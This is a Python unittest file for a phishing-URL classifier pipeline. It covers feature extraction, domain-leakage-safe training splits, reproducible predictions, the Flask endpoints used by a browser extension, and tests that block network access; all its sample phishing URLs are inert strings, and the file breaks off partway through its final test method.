"""
Basic end-to-end tests: features -> training -> inference -> /api/scan -> /api/check

Run:
    python -m unittest discover -s tests -v
    python tests/test_pipeline.py

Fast by design: the training test fits the real estimators on a small slice of
the real dataset rather than retraining the full models.  No URL is ever
fetched, resolved or executed -- every URL here is a plain string.
"""

import json
import os
import sys
import time
import unittest

import numpy as np
import pandas as pd

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "src"))
sys.path.insert(0, os.path.join(ROOT, "webapp"))

from features import extract_features, FEATURE_NAMES  # noqa: E402

MODEL_PATH = os.path.join(ROOT, "models", "url_models.joblib")
DATA_PATH = os.path.join(ROOT, "data", "real_urls.csv")

PHISHY = "http://secure-paypal-login.tk/verify/9231"
BENIGN = "https://en.wikipedia.org/wiki/Phishing"


# ---------------------------------------------------------------- features
class TestFeatures(unittest.TestCase):
    def test_returns_all_features_in_order(self):
        f = extract_features(BENIGN)
        self.assertEqual(list(f.keys()), FEATURE_NAMES)
        self.assertEqual(len(f), len(FEATURE_NAMES))
        self.assertGreaterEqual(len(f), 21)

    def test_all_values_numeric_and_finite(self):
        for u in [PHISHY, BENIGN, "example.com", "http://1.2.3.4/x", "a.co"]:
            for k, v in extract_features(u).items():
                self.assertIsInstance(v, (int, float), f"{k} on {u}")
                self.assertTrue(np.isfinite(v), f"{k} on {u}")

    def test_scheme_detection(self):
        self.assertEqual(extract_features("https://a.com")["is_https"], 1)
        self.assertEqual(extract_features("http://a.com")["is_https"], 0)

    def test_schemeless_url_is_handled(self):
        f = extract_features("www.example.com/login")
        self.assertGreater(f["url_length"], 0)
        self.assertEqual(f["is_https"], 0)

    def test_ip_and_at_symbol_flags(self):
        self.assertEqual(extract_features("http://192.168.0.1/a")["has_ip"], 1)
        self.assertEqual(extract_features("http://a.com/b")["has_ip"], 0)
        self.assertEqual(extract_features("http://a@b.com")["has_at_symbol"], 1)

    def test_suspicious_words_counted(self):
        self.assertGreater(
            extract_features("http://secure-login-verify.com")["suspicious_word_count"],
            extract_features("http://example.com")["suspicious_word_count"],
        )

    def test_no_network_access_during_extraction(self):
        """tldextract must be offline: fail loudly if anything opens a socket."""
        import socket
        real = socket.socket

        class Blocked(Exception):
            pass

        def boom(*a, **k):
            raise Blocked("feature extraction attempted a network connection")

        socket.socket = boom
        try:
            extract_features("http://some-unresolvable-host.example/path")
        finally:
            socket.socket = real

    def test_edge_cases_do_not_raise(self):
        for u in ["", "   ", "a.b", "http://", "ftp://x.com/y", "x.com?a=1&b=2"]:
            extract_features(u)

    def test_malformed_urls_do_not_raise(self):
        """Extraction runs on attacker-controlled strings from the API and the
        extension, so it must never raise -- a crash would be a DoS vector."""
        for u in ["http://[xx\x89e^\x01]/a", "http://[", "https://[]]/",
                  "http://%%%/", "\x00\x01.com", "http://a@@b.com",
                  "http://[::1]:8080/x", "h" * 5000]:
            f = extract_features(u)
            self.assertEqual(len(f), len(FEATURE_NAMES), u[:30])

    def test_scheme_does_not_leak_into_repeated_separators(self):
        """repeated_separators must not count the '//' of the scheme: that
        would make it a proxy for the data source rather than the URL."""
        self.assertEqual(extract_features("http://a.com/b")["repeated_separators"],
                         extract_features("a.com/b")["repeated_separators"])
        self.assertEqual(extract_features("https://a.com//b")["repeated_separators"],
                         extract_features("a.com//b")["repeated_separators"])

    def test_scheme_invariance_of_most_features(self):
        """Only is_https (and url_length) may differ when a scheme is added."""
        a = extract_features("http://example.com/path?x=1")
        b = extract_features("example.com/path?x=1")
        differing = {k for k in a if a[k] != b[k]}
        allowed = {"is_https", "url_length", "url_entropy", "num_slashes",
                   "num_dots", "letter_ratio_in_url", "digit_ratio_in_url",
                   "special_ratio_in_url", "path_ratio_of_url",
                   "query_ratio_of_url", "host_ratio_of_url", "num_tokens",
                   "mean_token_length", "url_char_repeat_max",
                   "num_special_chars", "max_token_length"}
        self.assertTrue(differing <= allowed,
                        f"scheme changes unexpected features: {differing - allowed}")


# ---------------------------------------------------------------- training
class TestTraining(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not os.path.exists(DATA_PATH):
            raise unittest.SkipTest("data/real_urls.csv missing -- run download_real_dataset.py")
        cls.df = pd.read_csv(DATA_PATH)

    def test_dataset_schema_and_labels(self):
        self.assertEqual(list(self.df.columns), ["url", "label"])
        self.assertEqual(set(self.df["label"].unique()), {0, 1})
        self.assertFalse(self.df["url"].duplicated().any(), "duplicate URLs present")
        self.assertFalse(self.df["url"].isna().any())

    def test_class_balance_is_reasonable(self):
        frac = self.df["label"].mean()
        self.assertTrue(0.2 < frac < 0.8, f"severe class imbalance: {frac:.2%}")

    def test_models_train_and_beat_baseline(self):
        from train import MODELS, build_feature_matrix
        from sklearn.base import clone
        from sklearn.model_selection import train_test_split

        sub = self.df.sample(n=min(2000, len(self.df)), random_state=42)
        X = build_feature_matrix(sub["url"].tolist())
        y = sub["label"].to_numpy()
        Xtr, Xte, ytr, yte = train_test_split(
            X, y, test_size=0.2, random_state=42, stratify=y)
        baseline = max(yte.mean(), 1 - yte.mean())
        for name, proto in MODELS.items():
            m = clone(proto)
            m.fit(Xtr, ytr)
            acc = m.score(Xte, yte)
            self.assertGreater(acc, baseline + 0.10,
                               f"{name} barely beats the majority-class baseline")

    def test_split_is_reproducible(self):
        from sklearn.model_selection import train_test_split
        y = self.df["label"].to_numpy()
        idx = np.arange(len(y))
        a, _ = train_test_split(idx, test_size=0.2, random_state=42, stratify=y)
        b, _ = train_test_split(idx, test_size=0.2, random_state=42, stratify=y)
        np.testing.assert_array_equal(a, b)


# --------------------------------------------------------------- inference
class TestInference(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing -- run train.py")
        import joblib
        cls.bundle = joblib.load(MODEL_PATH)

    def test_bundle_contract(self):
        """Keys relied on by webapp/app.py, monitor.py and the extension."""
        for key in ("models", "best_model_name", "feature_names"):
            self.assertIn(key, self.bundle)
        self.assertEqual(self.bundle["feature_names"], FEATURE_NAMES)
        self.assertTrue({"Decision Tree", "Random Forest", "XGBoost"}
                        <= set(self.bundle["models"]))
        self.assertIn(self.bundle["best_model_name"], self.bundle["models"])

    def test_threshold_is_valid(self):
        """v2 bundles carry a calibrated threshold; v1 bundles default to 0.5."""
        thr = float(self.bundle.get("threshold", 0.5))
        self.assertTrue(0.0 < thr < 1.0, f"threshold out of range: {thr}")

    def test_feature_count_matches_extractor(self):
        self.assertEqual(len(self.bundle["feature_names"]), len(FEATURE_NAMES))

    def test_models_are_not_degenerate(self):
        """Guards against the old synthetic collapse (a depth-1 single split)."""
        dt = self.bundle["models"]["Decision Tree"]
        self.assertGreater(dt.get_depth(), 3, "Decision Tree collapsed to a stump")
        self.assertGreater(dt.tree_.node_count, 20)

    def test_scores_are_probabilities(self):
        for u in [PHISHY, BENIGN]:
            row = pd.DataFrame([extract_features(u)],
                               columns=self.bundle["feature_names"])
            for name, m in self.bundle["models"].items():
                p = float(m.predict_proba(row)[0, 1])
                self.assertTrue(0.0 <= p <= 1.0, f"{name} returned {p}")

    def test_obvious_phish_scores_above_obvious_benign(self):
        best = self.bundle["models"][self.bundle["best_model_name"]]
        def score(u):
            return float(best.predict_proba(
                pd.DataFrame([extract_features(u)],
                             columns=self.bundle["feature_names"]))[0, 1])
        self.assertGreater(score(PHISHY), score(BENIGN))

    def test_monitor_scoring_helper(self):
        from monitor import score_url_all_models
        res = score_url_all_models(PHISHY, self.bundle)
        self.assertEqual(set(res), set(self.bundle["models"]))
        for v in res.values():
            self.assertTrue(0.0 <= v <= 1.0)

    def test_prediction_is_bit_identical(self):
        """Scores must be EXACTLY equal, not merely close.

        Previously this only asserted ~1e-12, tolerating the 1-2 ULP drift from
        RandomForest's parallel probability accumulation. That drift was not
        harmless: it flipped samples sitting on the decision threshold and moved
        the 4th decimal of Precision/F1/FPR between identical training runs.
        train.freeze_for_prediction() now serialises prediction, so equality is
        exact and this test holds the guarantee in place.
        """
        from monitor import score_url_all_models
        a = score_url_all_models(PHISHY, self.bundle)
        b = score_url_all_models(PHISHY, self.bundle)
        self.assertEqual(set(a), set(b))
        for name in a:
            self.assertEqual(a[name], b[name], f"{name} is not bit-reproducible")

    def test_served_models_are_frozen_for_prediction(self):
        """n_jobs must be 1 on every served estimator that exposes it."""
        for name, m in self.bundle["models"].items():
            for obj in (m, getattr(m, "_final_estimator", None)):
                if obj is not None and hasattr(obj, "n_jobs"):
                    self.assertEqual(obj.n_jobs, 1,
                                     f"{name}: n_jobs={obj.n_jobs}, predictions "
                                     f"will not be bit-reproducible")

    def test_batch_prediction_is_bit_identical(self):
        import joblib  # noqa: F401
        urls = [PHISHY, BENIGN, "a.com/x", "http://1.2.3.4/y",
                "secure-login.example.co.uk/verify"]
        X = pd.DataFrame([extract_features(u) for u in urls],
                         columns=self.bundle["feature_names"])
        for name, m in self.bundle["models"].items():
            runs = [m.predict_proba(X)[:, 1] for _ in range(4)]
            for r in runs[1:]:
                np.testing.assert_array_equal(runs[0], r, err_msg=name)


# --------------------------------------------------------------- Flask API
class TestFlaskAPI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing -- run train.py")
        from app import app
        app.config["TESTING"] = True
        cls.client = app.test_client()

    def test_index_renders(self):
        r = self.client.get("/")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"URL", r.data)

    # ---- /api/check : the endpoint the Chrome extension calls -------------
    def test_api_check_get(self):
        r = self.client.get("/api/check", query_string={"url": PHISHY})
        self.assertEqual(r.status_code, 200)
        d = json.loads(r.data)
        for k in ("url", "malicious", "score", "votes_malicious", "total_models"):
            self.assertIn(k, d)
        self.assertIsInstance(d["malicious"], bool)
        self.assertGreaterEqual(d["total_models"], 3)
        self.assertTrue(0.0 <= d["score"] <= 1.0)

    def test_api_check_post(self):
        r = self.client.post("/api/check", json={"url": BENIGN})
        self.assertEqual(r.status_code, 200)
        self.assertIn("malicious", json.loads(r.data))

    def test_api_check_rejects_empty_url(self):
        r = self.client.get("/api/check", query_string={"url": ""})
        self.assertEqual(r.status_code, 400)
        self.assertIn("error", json.loads(r.data))

    def test_api_check_cors_header_present(self):
        """The extension calls from a chrome-extension:// origin."""
        r = self.client.get("/api/check", query_string={"url": BENIGN},
                            headers={"Origin": "chrome-extension://abcdef"})
        self.assertIn("Access-Control-Allow-Origin", r.headers)

    # ---- /api/scan : the endpoint the web frontend calls ------------------
    def test_api_scan(self):
        r = self.client.post("/api/scan", json={"url": PHISHY})
        self.assertEqual(r.status_code, 200)
        d = json.loads(r.data)
        for k in ("url", "consensus", "votes_malicious", "total_models",
                  "models", "best_model_name", "top_features"):
            self.assertIn(k, d)
        self.assertGreaterEqual(len(d["models"]), 3)
        self.assertIn(d["consensus"], ("malicious", "benign"))
        self.assertEqual(sum(1 for m in d["models"] if m["is_best"]), 1)
        for m in d["models"]:
            self.assertTrue(0.0 <= m["score"] <= 1.0)
            self.assertIn(m["label"], ("malicious", "benign"))
        self.assertTrue(d["top_features"])

    def test_api_scan_rejects_empty_url(self):
        r = self.client.post("/api/scan", json={"url": "   "})
        self.assertEqual(r.status_code, 400)

    def test_scan_and_check_agree(self):
        """Both endpoints must give the same verdict for the same URL."""
        for u in (PHISHY, BENIGN):
            c = json.loads(self.client.get("/api/check",
                                           query_string={"url": u}).data)
            s = json.loads(self.client.post("/api/scan", json={"url": u}).data)
            self.assertEqual(c["malicious"], s["consensus"] == "malicious", u)
            self.assertEqual(c["votes_malicious"], s["votes_malicious"], u)


if __name__ == "__main__":
    unittest.main(verbosity=2)


# ------------------------------------------------------------ n-gram block
class TestNgramFeatures(unittest.TestCase):
    """The hashed char/token n-gram block must be stable and bounded."""

    def test_subsets_partition_the_feature_set(self):
        from features import (FEATURE_NAMES, LEGACY_FEATURE_NAMES,
                              STRUCTURAL_FEATURE_NAMES, NGRAM_FEATURE_NAMES,
                              FEATURE_SETS)
        self.assertEqual(len(STRUCTURAL_FEATURE_NAMES) + len(NGRAM_FEATURE_NAMES),
                         len(FEATURE_NAMES))
        self.assertEqual(set(STRUCTURAL_FEATURE_NAMES) & set(NGRAM_FEATURE_NAMES),
                         set())
        # the original 21 stay first, so legacy bundles index the same columns
        self.assertEqual(FEATURE_NAMES[:21], LEGACY_FEATURE_NAMES)
        self.assertTrue(set(LEGACY_FEATURE_NAMES) <= set(STRUCTURAL_FEATURE_NAMES))
        for key, names in FEATURE_SETS.items():
            self.assertTrue(set(names) <= set(FEATURE_NAMES), key)

    def test_char_ngram_buckets_are_a_distribution(self):
        from features import extract_features as ef
        f = ef("http://secure-paypal-login.tk/verify/9231")
        cng = [v for k, v in f.items() if k.startswith("cng3_")]
        self.assertAlmostEqual(sum(cng), 1.0, places=9)
        self.assertTrue(all(0.0 <= v <= 1.0 for v in cng))

    def test_ngrams_do_not_encode_the_scheme(self):
        """The two training corpora differ in whether they store a scheme, so
        an n-gram that saw 'http://' would encode the row's source."""
        from features import extract_features as ef, NGRAM_FEATURE_NAMES
        a = ef("http://secure-paypal-login.tk/verify/9231")
        b = ef("secure-paypal-login.tk/verify/9231")
        c = ef("HTTPS://secure-paypal-login.tk/verify/9231")
        for k in NGRAM_FEATURE_NAMES:
            self.assertEqual(a[k], b[k], k)
            self.assertEqual(a[k], c[k], k)

    def test_hashing_is_stable_across_interpreter_runs(self):
        """Python's hash() is salted per process; these features must not be,
        or a saved model would mean something different after a restart."""
        import subprocess
        code = ("import sys; sys.path.insert(0, 'src');"
                "from features import extract_features as e, NGRAM_FEATURE_NAMES as N;"
                "f=e('http://secure-paypal-login.tk/verify/9231');"
                "print([round(f[k],12) for k in N])")
        outs = set()
        for seed in ("0", "1", "random"):
            env = dict(os.environ, PYTHONHASHSEED=seed)
            r = subprocess.run([sys.executable, "-c", code], cwd=ROOT,
                               capture_output=True, text=True, env=env)
            self.assertEqual(r.returncode, 0, r.stderr)
            outs.add(r.stdout.strip())
        self.assertEqual(len(outs), 1, "n-gram features vary with PYTHONHASHSEED")

    def test_ngram_extraction_opens_no_socket(self):
        import socket
        real = socket.socket
        socket.socket = lambda *a, **k: (_ for _ in ()).throw(
            AssertionError("n-gram extraction attempted a network connection"))
        try:
            extract_features("http://xn--80ak6aa92e.com/аpple/login?a=%41%42")
        finally:
            socket.socket = real


# --------------------------------------------------------- leakage control
class TestLeakageControl(unittest.TestCase):
    def test_canonicalization_folds_only_comparison_noise(self):
        from leakage import canonicalize
        same = ["http://www.Example.com/a/", "https://example.com/a",
                "EXAMPLE.com/a/", "www.example.com/a"]
        self.assertEqual(len({canonicalize(u) for u in same}), 1)
        # ...and does not collapse genuinely different URLs
        self.assertNotEqual(canonicalize("example.com/a"),
                            canonicalize("example.com/b"))

    def test_canonicalization_is_not_used_as_a_feature(self):
        """Features must see the URL as a browser would: scheme and case are
        real signal, so canonicalization must stay out of extraction."""
        self.assertEqual(extract_features("https://a.com")["is_https"], 1)
        self.assertEqual(extract_features("http://a.com")["is_https"], 0)
        self.assertNotEqual(extract_features("http://www.a.com")["has_www"],
                            extract_features("http://a.com")["has_www"])

    def test_registered_domain_grouping(self):
        from leakage import registered_domain
        self.assertEqual(registered_domain("http://login.secure.example.co.uk/x"),
                         "example.co.uk")
        self.assertEqual(registered_domain("https://a.b.example.com"), "example.com")
        # never empty: every row must get a group
        for u in ("", "http://", "1.2.3.4", "garbage"):
            self.assertTrue(registered_domain(u))

    def test_exact_and_canonical_duplicates_are_removed(self):
        from leakage import drop_exact_duplicates
        df = pd.DataFrame({
            "url": ["http://a.com/x", "https://www.a.com/x/", "http://b.com/y",
                    "http://b.com/y"],
            "label": [1, 1, 0, 0]})
        out, rep = drop_exact_duplicates(df)
        self.assertEqual(len(out), 2)
        self.assertEqual(rep["exact_string_duplicates"], 1)
        self.assertEqual(rep["canonical_duplicates_removed"], 2)
        self.assertEqual(rep["label_conflicting_canonical_urls"], 0)

    def test_label_conflicts_are_reported_not_hidden(self):
        from leakage import drop_exact_duplicates
        df = pd.DataFrame({"url": ["http://a.com/x", "https://a.com/x"],
                           "label": [0, 1]})
        _, rep = drop_exact_duplicates(df)
        self.assertEqual(rep["label_conflicting_canonical_urls"], 1)

    def test_domain_overlap_is_detected(self):
        from leakage import domain_overlap, url_overlap
        a = ["http://x.com/1", "http://y.com/1"]
        b = ["http://x.com/2", "http://z.com/2"]
        self.assertEqual(domain_overlap(a, b)["shared"], 1)
        self.assertEqual(url_overlap(a, b)["shared"], 0)

    def test_random_split_leaks_domains_and_grouped_split_does_not(self):
        """The whole point of the v3 protocol: prove the random split leaks."""
        from sklearn.model_selection import (train_test_split, GroupShuffleSplit,
                                             StratifiedGroupKFold)
        from leakage import (registered_domains, split_domain_leakage,
                             assert_no_domain_leakage, drop_exact_duplicates)
        df = pd.read_csv(DATA_PATH).dropna(subset=["url", "label"])
        df, _ = drop_exact_duplicates(df)
        y = df["label"].to_numpy()
        groups = registered_domains(df["url"]).to_numpy()
        idx = np.arange(len(df))

        rtr, rte = train_test_split(idx, test_size=0.2, random_state=42, stratify=y)
        rnd = split_domain_leakage(groups, rtr, rte)
        self.assertGreater(rnd["shared_domains"], 0,
                           "random split unexpectedly domain-disjoint")

        gtr, gte = next(GroupShuffleSplit(
            n_splits=1, test_size=0.2, random_state=42).split(idx, y, groups))
        assert_no_domain_leakage(groups, gtr, gte, "GroupShuffleSplit")

        sgkf = StratifiedGroupKFold(n_splits=5, shuffle=True, random_state=42)
        for i, (tr, va) in enumerate(sgkf.split(idx, y, groups), 1):
            assert_no_domain_leakage(groups, tr, va, f"fold {i}")

    def test_assert_no_domain_leakage_actually_raises(self):
        """A leakage gate that never fires is worse than no gate."""
        from leakage import assert_no_domain_leakage
        groups = np.array(["a.com", "a.com", "b.com", "c.com"])
        with self.assertRaises(AssertionError):
            assert_no_domain_leakage(groups, [0, 2], [1, 3])

    def test_training_data_has_no_canonical_duplicates_after_dedup(self):
        from leakage import drop_exact_duplicates, canonicalize
        frames = [pd.read_csv(DATA_PATH).dropna(subset=["url", "label"])]
        hn = os.path.join(ROOT, "data", "hard_negatives.csv")
        if os.path.exists(hn):
            frames.append(pd.read_csv(hn).dropna(subset=["url"]))
        df = pd.concat(frames, ignore_index=True)
        out, _ = drop_exact_duplicates(df)
        self.assertFalse(out["url"].map(canonicalize).duplicated().any())

    def test_unseen_corpus_is_isolated_if_cached(self):
        """The independent corpus must share no URL with training data."""
        from leakage import url_overlap
        cache = os.path.join(ROOT, "data", "unseen_external_DO_NOT_TRAIN.csv")
        if not os.path.exists(cache):
            raise unittest.SkipTest("unseen corpus not cached -- "
                                    "run src/validate_unseen.py once")
        train = [pd.read_csv(DATA_PATH)["url"].astype(str)]
        hn = os.path.join(ROOT, "data", "hard_negatives.csv")
        if os.path.exists(hn):
            train.append(pd.read_csv(hn)["url"].astype(str))
        pool = pd.concat(train, ignore_index=True)
        ue = pd.read_csv(cache).dropna(subset=["url"])
        rep = url_overlap(pool, ue["url"])
        self.assertEqual(rep["shared"], 0,
                         f"unseen corpus shares {rep['shared']} URLs with training: "
                         f"{rep['examples']}")


# ------------------------------------------------- domain-aware artifacts
class TestDomainAwareArtifacts(unittest.TestCase):
    MODELS_DIR = os.path.join(ROOT, "models")

    def _read(self, name):
        fp = os.path.join(self.MODELS_DIR, name)
        if not os.path.exists(fp):
            raise unittest.SkipTest(f"{name} missing -- run src/train.py")
        return pd.read_csv(fp)

    def test_cv_results_reports_mean_and_std(self):
        cv = self._read("cv_results.csv")
        for m in ("Accuracy", "Precision", "Recall", "F1-Score", "ROC-AUC",
                  "FPR", "FNR"):
            self.assertIn(f"{m}_mean", cv.columns)
            self.assertIn(f"{m}_std", cv.columns)
            self.assertTrue((cv[f"{m}_mean"].between(0, 1)).all(), m)
            self.assertTrue((cv[f"{m}_std"] >= 0).all(), m)

    def test_all_four_algorithms_are_compared(self):
        expected = {"Decision Tree", "Random Forest", "XGBoost",
                    "Logistic Regression"}
        cv = self._read("cv_results.csv")
        self.assertEqual(set(cv["Algorithm"]), expected)
        dd = self._read("domain_disjoint_results.csv")
        self.assertEqual(set(dd["Algorithm"]), expected)

    def test_cv_fold_audit_shows_zero_shared_domains(self):
        fa = self._read("cv_fold_audit.csv")
        self.assertEqual(int(fa["shared_domains"].sum()), 0)
        self.assertGreaterEqual(len(fa), 5)

    def test_validation_comparison_covers_three_protocols(self):
        vc = self._read("validation_comparison.csv")
        for col in ("random_8020", "domain_disjoint",
                    "domain_cv_5fold_mean", "domain_cv_5fold_std"):
            self.assertIn(col, vc.columns)

    def test_random_split_is_more_optimistic_than_domain_disjoint(self):
        """Documents the leakage: the random split must not look WORSE."""
        vc = self._read("validation_comparison.csv")
        auc = vc[vc.Metric == "ROC-AUC"]
        self.assertTrue((auc["random_8020"] >= auc["domain_disjoint"]).all(),
                        "random split no longer optimistic -- re-check grouping")

    def test_baseline_vs_improved_has_all_feature_sets(self):
        bi = self._read("baseline_vs_improved.csv")
        self.assertEqual(set(bi["FeatureSet"]), {"legacy", "structural", "full"})
        self.assertEqual(int(bi.loc[bi.FeatureSet == "legacy", "NumFeatures"].iloc[0]), 21)

    def test_serving_model_matches_domain_aware_evidence(self):
        """The bundle must serve whichever model won on domain-aware CV --
        not a hard-coded Random Forest."""
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing")
        import joblib
        b = joblib.load(MODEL_PATH)
        cv = self._read("cv_results.csv").set_index("Algorithm")
        self.assertEqual(b["best_model_name"], cv["ROC-AUC_mean"].idxmax())

    def test_plots_exist(self):
        for f in ("roc_comparison.png", "pr_comparison.png",
                  "confusion_matrices.png", "roc_domain_cv.png",
                  "pr_domain_cv.png", "confusion_matrices_domain_cv.png",
                  "feature_importance.png"):
            fp = os.path.join(self.MODELS_DIR, f)
            if not os.path.exists(fp):
                raise unittest.SkipTest(f"{f} missing -- run src/train.py")
            self.assertGreater(os.path.getsize(fp), 1000, f)

    def test_baseline_artifacts_preserved(self):
        bdir = os.path.join(self.MODELS_DIR, "baseline")
        self.assertTrue(os.path.isdir(bdir), "baseline directory was removed")
        for f in ("url_models.joblib", "algorithm_comparison.csv",
                  "features_baseline.py", "MANIFEST.json"):
            self.assertTrue(os.path.exists(os.path.join(bdir, f)),
                            f"baseline/{f} missing")

    def test_baseline_bundle_still_has_21_features(self):
        import joblib
        fp = os.path.join(self.MODELS_DIR, "baseline", "url_models.joblib")
        if not os.path.exists(fp):
            raise unittest.SkipTest("baseline bundle missing")
        b = joblib.load(fp)
        self.assertEqual(len(b["feature_names"]), 21)


# ------------------------------------------------------ reproducibility
class TestReproducibility(unittest.TestCase):
    def test_feature_extraction_is_deterministic(self):
        u = "http://secure-paypal-login.tk/verify/9231?a=%41&b=../x"
        a, b = extract_features(u), extract_features(u)
        self.assertEqual(a, b)

    def test_grouped_folds_are_reproducible(self):
        from sklearn.model_selection import StratifiedGroupKFold
        from leakage import registered_domains
        df = pd.read_csv(DATA_PATH).dropna(subset=["url", "label"]).head(3000)
        y = df["label"].to_numpy()
        g = registered_domains(df["url"]).to_numpy()
        X = np.arange(len(df)).reshape(-1, 1)

        def split():
            return [(tuple(a), tuple(b)) for a, b in StratifiedGroupKFold(
                n_splits=5, shuffle=True, random_state=42).split(X, y, g)]
        self.assertEqual(split(), split())

    def test_identically_seeded_models_agree(self):
        from train import make_models, build_feature_matrix
        from sklearn.model_selection import train_test_split
        df = pd.read_csv(DATA_PATH).sample(n=1500, random_state=0)
        X = build_feature_matrix(df["url"].tolist())
        y = df["label"].to_numpy()
        Xtr, Xte, ytr, _ = train_test_split(X, y, test_size=0.2, random_state=42,
                                            stratify=y)
        for name in ("Decision Tree", "XGBoost", "Logistic Regression"):
            a = make_models()[name].fit(Xtr, ytr).predict_proba(Xte)[:, 1]
            b = make_models()[name].fit(Xtr, ytr).predict_proba(Xte)[:, 1]
            np.testing.assert_allclose(a, b, atol=1e-12, err_msg=name)

    def test_all_model_probabilities_stay_in_unit_interval(self):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing")
        import joblib
        b = joblib.load(MODEL_PATH)
        urls = [PHISHY, BENIGN, "", "   ", "a.b", "http://",
                "http://[xx\x89e^\x01]/a", "h" * 3000,
                "http://xn--80ak6aa92e.com/login", "1.2.3.4:31337/x"]
        X = pd.DataFrame([extract_features(u) for u in urls],
                         columns=b["feature_names"])
        for name, m in b["models"].items():
            p = m.predict_proba(X)[:, 1]
            self.assertTrue(np.all((p >= 0.0) & (p <= 1.0)), name)
            self.assertTrue(np.all(np.isfinite(p)), name)


# ------------------------------------------- extension / frontend contract
class TestClientContracts(unittest.TestCase):
    """Pins the exact response shape the Chrome extension and the web frontend
    read. Feature-count or model changes must not alter these fields."""

    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing")
        from app import app
        app.config["TESTING"] = True
        cls.client = app.test_client()

    def test_extension_fields_exactly_as_background_js_reads_them(self):
        """extension/background.js reads: malicious, score, votes_malicious,
        total_models (and treats a truthy `error` as fail-open)."""
        d = json.loads(self.client.get(
            "/api/check", query_string={"url": PHISHY}).data)
        self.assertIsInstance(d["malicious"], bool)
        self.assertIsInstance(d["score"], (int, float))
        self.assertIsInstance(d["votes_malicious"], int)
        self.assertIsInstance(d["total_models"], int)
        self.assertNotIn("error", d)
        self.assertTrue(0.0 <= d["score"] <= 1.0)
        self.assertLessEqual(d["votes_malicious"], d["total_models"])

    def test_extension_fails_open_on_bad_input(self):
        """A 4xx must carry `error` so background.js bails instead of blocking."""
        r = self.client.get("/api/check", query_string={"url": ""})
        self.assertEqual(r.status_code, 400)
        self.assertIn("error", json.loads(r.data))

    def test_frontend_fields_exactly_as_app_js_reads_them(self):
        """webapp/static/app.js reads: consensus, models[].{name,score,label,
        is_best}, votes_malicious, total_models, best_model_name, top_features."""
        d = json.loads(self.client.post("/api/scan", json={"url": PHISHY}).data)
        self.assertIn(d["consensus"], ("malicious", "benign"))
        self.assertIsInstance(d["best_model_name"], str)
        self.assertIsInstance(d["votes_malicious"], int)
        self.assertIsInstance(d["total_models"], int)
        for m in d["models"]:
            self.assertEqual(set(m), {"name", "score", "label", "is_best"})
            self.assertIn(m["label"], ("malicious", "benign"))
        for f in d["top_features"]:
            self.assertEqual(set(f), {"name", "value"})
            self.assertIsInstance(f["value"], (int, float))

    def test_served_feature_names_match_the_extractor(self):
        """app.py builds its row with bundle['feature_names']; a mismatch with
        the live extractor would silently feed the model wrong columns."""
        import joblib
        b = joblib.load(MODEL_PATH)
        feats = extract_features(PHISHY)
        self.assertTrue(set(b["feature_names"]) <= set(feats),
                        "bundle expects features the extractor no longer emits")

    def test_index_page_still_renders_with_the_new_feature_count(self):
        r = self.client.get("/")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"api/scan", r.data + b"api/scan")  # page loads app.js


# ------------------------------------------------------- network isolation
class TestNetworkIsolation(unittest.TestCase):
    """Feature extraction runs on attacker-controlled strings. It must never
    resolve, fetch, crawl, execute or connect to anything."""

    URLS = [PHISHY, BENIGN, "http://xn--80ak6aa92e.com/login",
            "http://1.2.3.4:31337/a", "аpple.com/signin",
            "http://a.very.deep.sub.domain.example.co.uk/a/b/c?d=%41%42#f",
            "bit.ly/abc", "", "http://[::1]:8080/x"]

    def _blocked(self):
        """Patch every outbound primitive, not just socket.socket."""
        import socket
        import ssl
        import urllib.request

        class NetworkAttempted(Exception):
            pass

        saved = {
            "socket.socket": socket.socket,
            "socket.create_connection": socket.create_connection,
            "socket.getaddrinfo": socket.getaddrinfo,
            "socket.gethostbyname": socket.gethostbyname,
            "ssl.SSLContext.wrap_socket": ssl.SSLContext.wrap_socket,
            "urllib.request.urlopen": urllib.request.urlopen,
        }

        def boom(*a, **k):
            raise NetworkAttempted("feature extraction touched the network")

        socket.socket = boom
        socket.create_connection = boom
        socket.getaddrinfo = boom
        socket.gethostbyname = boom
        ssl.SSLContext.wrap_socket = boom
        urllib.request.urlopen = boom
        return saved, NetworkAttempted

    @staticmethod
    def _restore(saved):
        import socket
        import ssl
        import urllib.request
        socket.socket = saved["socket.socket"]
        socket.create_connection = saved["socket.create_connection"]
        socket.getaddrinfo = saved["socket.getaddrinfo"]
        socket.gethostbyname = saved["socket.gethostbyname"]
        ssl.SSLContext.wrap_socket = saved["ssl.SSLContext.wrap_socket"]
        urllib.request.urlopen = saved["urllib.request.urlopen"]

    def test_extraction_touches_no_network_primitive(self):
        saved, _ = self._blocked()
        try:
            for u in self.URLS:
                extract_features(u)
        finally:
            self._restore(saved)

    def test_bulk_extraction_over_real_corpus_touches_no_network(self):
        if not os.path.exists(DATA_PATH):
            raise unittest.SkipTest("data/real_urls.csv missing")
        urls = pd.read_csv(DATA_PATH)["url"].astype(str).head(500).tolist()
        saved, _ = self._blocked()
        try:
            for u in urls:
                extract_features(u)
        finally:
            self._restore(saved)

    def test_the_block_itself_works(self):
        """A network guard that cannot fail is not a guard."""
        import socket
        saved, NetworkAttempted = self._blocked()
        try:
            with self.assertRaises(NetworkAttempted):
                socket.socket()
            with self.assertRaises(NetworkAttempted):
                socket.getaddrinfo("example.com", 80)
        finally:
            self._restore(saved)

    def test_leakage_module_touches_no_network(self):
        from leakage import canonicalize, registered_domain, domain_overlap
        saved, _ = self._blocked()
        try:
            for u in self.URLS:
                canonicalize(u)
                registered_domain(u)
            domain_overlap(self.URLS, self.URLS)
        finally:
            self._restore(saved)

    def test_scoring_an_url_touches_no_network(self):
        """The served path -- extract + predict -- must also be offline."""
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models/url_models.joblib missing")
        import joblib
